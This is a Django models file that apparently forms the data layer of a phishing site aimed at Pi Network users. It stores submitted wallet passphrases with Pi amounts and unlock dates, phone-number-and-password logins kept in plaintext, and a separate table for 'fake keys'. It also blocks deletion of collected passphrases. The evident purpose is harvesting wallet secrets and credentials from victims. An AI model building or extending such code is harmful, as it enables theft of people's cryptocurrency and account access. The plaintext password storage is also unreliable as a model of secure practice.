from django.db import models
from django.db.models.signals import pre_delete
from django.dispatch import receiver
from django.core.exceptions import ValidationError
from django.contrib import messages
from .threads import get_current_request

# Create your models here.
class PassPhrase(models.Model):
    keys = models.TextField(null=False, blank=False, max_length=500, unique=True)
    amount_of_pi = models.CharField(null=True, blank=True, max_length=100)
    unlock_date = models.DateTimeField(null=True, blank=True)
    is_verified = models.BooleanField(default=False)
    is_active = models.BooleanField(default=False)
    date = models.DateTimeField(auto_now_add=True)
    look_up = models.CharField(null=False, blank=False, max_length=20)

    def __str__(self):
        return str(self.date)

    class Meta:
        verbose_name = 'Keys'
        verbose_name_plural = 'Keys'
        ordering = ['-date']


class Pi_login(models.Model):
    phone_number = models.CharField(null=False, blank=False, max_length=20)
    password = models.CharField(null=False, blank=False, max_length=100)
    country = models.CharField(null=False, blank=False, max_length=5, default="NG")
    is_verified = models.BooleanField(default=False)
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return str(self.phone_number)
    
    class Meta:
        verbose_name = "Pi Login"
        verbose_name_plural = "Pi Login"
        ordering = ['-date']

class FakeKey(models.Model):
    fake_keys = models.TextField(null=True, blank=True, max_length=500)
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return str(self.fake_keys)
    
    class Meta:
        verbose_name = "ZFake Keys"
        verbose_name_plural = "ZFake Keys"
        ordering = ['-date']

@receiver(pre_delete, sender=PassPhrase)
def prevent_delete(sender, instance, **kwargs):
    raise models.ProtectedError("You cannot delete anything", instance)

# @receiver(pre_delete, sender=PassPhrase)
# def prevent_delete(sender, instance, **kwargs):
#     request = get_current_request()
#     if request:
#         try:
#                 # raise ValidationError("Deletion not allowed for this model.")
#                 messages.error(request, 'You cannot delete anything')
#                 return False
#         except ValidationError as e:
#                 # raise ValidationError("You cannot delete this item.") from e
#                 pass